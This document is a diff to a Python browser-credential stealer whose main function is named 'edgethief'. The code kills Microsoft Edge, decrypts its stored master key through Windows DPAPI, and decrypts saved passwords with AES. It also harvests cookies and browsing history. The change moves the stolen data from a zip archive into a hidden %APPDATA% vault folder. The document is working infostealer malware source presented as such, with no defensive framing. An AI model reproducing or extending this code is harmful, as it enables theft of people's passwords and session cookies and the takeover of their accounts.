@@ -1,7 +1,6 @@
 import zipfile, time, string, random, shutil, psutil, sqlite3, base64, json, os
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
-
 appdata = os.getenv('LOCALAPPDATA')
 user = os.path.expanduser("~")
 edge_path = os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', 'Default')
@@ -14,7 +13,6 @@ def kill_edge():
                 print("Terminated Edge process:", proc.info['pid'])
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 pass
-
 def get_master_key():
     local_state_path = os.path.join(appdata, 'Microsoft', 'Edge', 'User Data', 'Local State')
     if not os.path.exists(local_state_path):
@@ -39,10 +37,8 @@ def get_master_key():
         master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
     except Exception as e:
         print(f"Failed to decrypt the master key: {e}")
-        return None
-    
+        return None    
     return master_key
-
 def decrypt_password(buff, master_key):
     try:
         iv = buff[3:15]
@@ -111,18 +107,25 @@ def random_filename(prefix):
     return f"{prefix}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"
 
 def save_results(logins, cookies, history):
-    zip_path = os.path.join(user, 'edge.zip')
-    if os.path.exists(zip_path):
-        os.remove(zip_path)
-    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        for name, content in [('logins.txt', logins), ('cookies.txt', cookies), ('history.txt', history)]:
-            if content:
-                file_path = os.path.join(user, name)
-                with open(file_path, 'w', encoding='utf-8') as f:
-                    f.write(content)
-                zipf.write(file_path, name)
-                os.remove(file_path)
-    print(f"Saved login data, cookies, and history in {zip_path}.")
+    vault_dir = os.path.join(os.getenv('APPDATA'), 'vault', 'edge')
+    if not os.path.exists(vault_dir):
+        os.makedirs(vault_dir)
+    
+    if logins:
+        logins_filename = os.path.join(vault_dir, 'edgelogins.txt')
+        with open(logins_filename, 'w', encoding="utf-8") as logins_file:
+            logins_file.write(logins)
+        
+    if cookies:
+        cookies_filename = os.path.join(vault_dir, 'edgecookies.txt')
+        with open(cookies_filename, 'w', encoding="utf-8") as cookies_file:
+            cookies_file.write(cookies)
+        
+    if history:
+        history_filename = os.path.join(vault_dir, 'edgehistory.txt')
+        with open(history_filename, 'w', encoding="utf-8") as history_file:
+            history_file.write(history)
+
 
 def edgethief():
     kill_edge()
